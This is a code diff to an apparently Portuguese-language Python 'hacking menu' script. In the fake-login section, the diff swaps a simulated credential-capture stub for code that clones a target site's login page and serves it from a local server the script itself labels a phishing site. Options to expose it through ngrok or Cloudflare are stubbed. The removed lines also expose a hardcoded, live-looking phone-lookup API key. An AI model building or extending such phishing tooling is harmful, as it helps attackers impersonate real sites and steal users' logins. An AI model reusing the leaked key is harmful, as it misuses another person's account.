@@ -2,11 +2,12 @@ import os
 import subprocess
 from colorama import init, Fore, Style
 import time
-import requests
-import numbers
 import numlookupapi
-import nmap
+import requests
 from bs4 import BeautifulSoup
+import threading
+import http.server
+import socketserver
 
 # Função para limpar a tela do console
 def clear_console():
@@ -237,118 +238,128 @@ def fake_login_pages(language):
     else:
         print("Digite a URL do site para clonar para login falso:")
 
-    url = input("URL: ").strip()
+    url = input("URL: ")
 
-    # Perguntar qual servidor usar
-    server_choice = input("Choose a server to use (localhost, ngrok, etc.): ").strip().lower()
+    # Selecionar o servidor (por enquanto, apenas localhost)
+    server_choice = '1'  # Escolha padrão para localhost
 
-    # Lógica para baixar o HTML e CSS uma vez
-    try:
-        # Baixar HTML e CSS da URL
-        download_website_files(url)
+    clone_website(url, server_choice, language)
 
-        # Simular captura de credenciais
-        simulate_credential_capture(url, server_choice, language)
-
-    except Exception as e:
-        print(Fore.RED + f"Error: {e}")
-
-    input("\nPress Enter to continue...")
-
-# Função para baixar HTML e CSS da URL
-def download_website_files(url):
-    # Verificar se o diretório existe para armazenar os arquivos
-    if not os.path.exists('fake_login_pages'):
-        os.makedirs('fake_login_pages')
-
-    # Baixar HTML e CSS da URL fornecida
-    response = requests.get(url)
-    if response.status_code == 200:
-        # Extrair nome do site para salvar os arquivos
-        site_name = url.split('//')[-1].split('.')[0]
-        
-        # Salvar HTML
-        with open(f'fake_login_pages/{site_name}.html', 'w', encoding='utf-8') as f:
-            f.write(response.text)
-            print(f"HTML for {url} downloaded successfully.")
-
-        # Procurar CSS na página
-        soup = BeautifulSoup(response.text, 'html.parser')
-        css_links = soup.find_all('link', rel='stylesheet')
-
-        # Baixar CSS
-        for link in css_links:
-            css_url = link.get('href')
-            if css_url.startswith('http'):
-                css_response = requests.get(css_url)
-                if css_response.status_code == 200:
-                    css_filename = css_url.split('/')[-1]
-                    with open(f'fake_login_pages/{css_filename}', 'w', encoding='utf-8') as css_file:
-                        css_file.write(css_response.text)
-                        print(f"CSS {css_filename} for {url} downloaded successfully.")
-
-    else:
-        raise Exception(f"Failed to download HTML from {url}")
-
-# Função para simular captura de credenciais
-def simulate_credential_capture(url, server_choice, language):
+# Função para clonar um site para login falso
+def clone_website(url, server_choice, language):
     clear_console()
     if language == '1':
-        print(f"Simulating credential capture for {url} using {server_choice} server...")
+        print(f"Cloning {url} for fake login...")
     else:
-        print(f"Simulando captura de credenciais para {url} usando servidor {server_choice}...")
+        print(f"Clonando {url} para login falso...")
 
-    # Lógica para capturar credenciais (simulada)
-    time.sleep(3)
-    input("Press Enter to continue...")
+    try:
+        # Fazendo requisição GET para obter o conteúdo da página
+        response = requests.get(url)
+        if response.status_code == 200:
+            # Parseando o conteúdo com BeautifulSoup
+            soup = BeautifulSoup(response.text, 'html.parser')
+
+            # Salvando o HTML e CSS
+            html_content = soup.prettify()
+            css_content = ''  # Lógica para extrair o CSS da página
+
+            # Salvar HTML e CSS em arquivos locais
+            with open('index.html', 'w', encoding='utf-8') as html_file:
+                html_file.write(html_content)
+
+            with open('styles.css', 'w', encoding='utf-8') as css_file:
+                css_file.write(css_content)
+
+            print("HTML and CSS downloaded successfully!")
+
+            # Continuar com a execução no servidor selecionado
+            if server_choice == '1':
+                run_local_server(language)
+            elif server_choice == '2':
+                # Implementar a lógica para ngrok
+                pass
+            elif server_choice == '3':
+                # Implementar a lógica para Cloudflare
+                pass
+
+        else:
+            print(f"Failed to clone {url}. Status code: {response.status_code}")
+
+    except Exception as e:
+        print(f"Error cloning website: {e}")
+
+# Função para executar o servidor local
+def run_local_server(language):
+    clear_console()
+    if language == '1':
+        print("Running phishing site on localhost...")
+    else:
+        print("Executando site de phishing em localhost...")
+
+    # Configurar o servidor HTTP local para servir os arquivos clonados
+    class PhishingServer(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory='./')  # Diretório onde os arquivos estão salvos
+
+    try:
+        # Iniciar o servidor em uma thread separada
+        server = socketserver.TCPServer(('localhost', 8000), PhishingServer)
+        server_thread = threading.Thread(target=server.serve_forever)
+        server_thread.daemon = True
+        server_thread.start()
+
+        print("Server running at http://localhost:8000")
+        input("\nPress Enter to stop the phishing server and continue...")
+
+        # Após capturar as credenciais, parar o servidor
+        server.shutdown()
+        server.server_close()
+
+        # Limpar os arquivos HTML e CSS
+        clean_up_files()
+
+    except Exception as e:
+        print(f"Error running local server: {e}")
+
+# Função para limpar os arquivos HTML e CSS
+def clean_up_files():
+    try:
+        os.remove('index.html')
+        os.remove('styles.css')
+        print("Files cleaned up successfully!")
+    except Exception as e:
+        print(f"Error cleaning up files: {e}")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
     clear_console()
     if language == '1':
         print("Phone Number Information")
-        print("Enter a phone number to obtain information (Country Code + Carrier area code):")
+        print("------------------------")
+        number = input("Enter the phone number: ")
+        # Lógica para obter informações do número de telefone usando a API
+        # Exemplo:
+        # response = numlookupapi.lookup(number)
+        # print(response)
     else:
         print("Informações de Número de Telefone")
-        print("Digite um número de telefone para obter informações(Código do País + DDD da operadora):")
-
-    phone_number = input("Phone number: ")
-
-    # Consulta à API numlookupapi para obter informações detalhadas
-    try:
-        client = numlookupapi.Client('num_live_nPxUn5CQCi43HYw85qiaohr9FvykkoqCa1x8QkEy')  # Substitua 'YOUR-API-KEY' pelo seu API key
-        result = client.validate(phone_number)
-        
-        # Formatando a resposta no estilo desejado
-        print("\nInformation for phone number", phone_number)
-        print("Valid:", result.get("valid", False))
-        print("Number:", result.get("number", ""))
-        print("Local Format:", result.get("local_format", ""))
-        print("International Format:", result.get("international_format", ""))
-        print("Country Prefix:", result.get("country_prefix", ""))
-        print("Country Code:", result.get("country_code", ""))
-        print("Country Name:", result.get("country_name", ""))
-        print("Location:", result.get("location", ""))
-        print("Carrier:", result.get("carrier", ""))
-        print("Line Type:", result.get("line_type", ""))
-
-    except Exception as e:
-        print(Fore.RED + f"Error fetching phone number information: {e}")
+        print("---------------------------------")
+        number = input("Digite o número de telefone: ")
+        # Lógica para obter informações do número de telefone usando a API
+        # Exemplo:
+        # response = numlookupapi.lookup(number)
+        # print(response)
 
     input("\nPress Enter to continue...")
 
 # Função principal para iniciar o programa
-def start_program():
-    init(autoreset=True)
-    language = input("Choose language (1. English / 2. Portuguese): ")
-
-    if language not in ['1', '2']:
-        print("Invalid choice. Defaulting to English.")
-        language = '1'
-
+def main():
+    init(autoreset=True)  # Inicialização do Colorama para resetar as cores do terminal
+    language = input("Choose language / Escolha o idioma:\n1. English\n2. Português\nChoice / Escolha: ")
     welcome_message(language)
+    loading_screen()
     main_menu(language)
 
-# Início do programa
 if __name__ == "__main__":
-    start_program()
+    main()
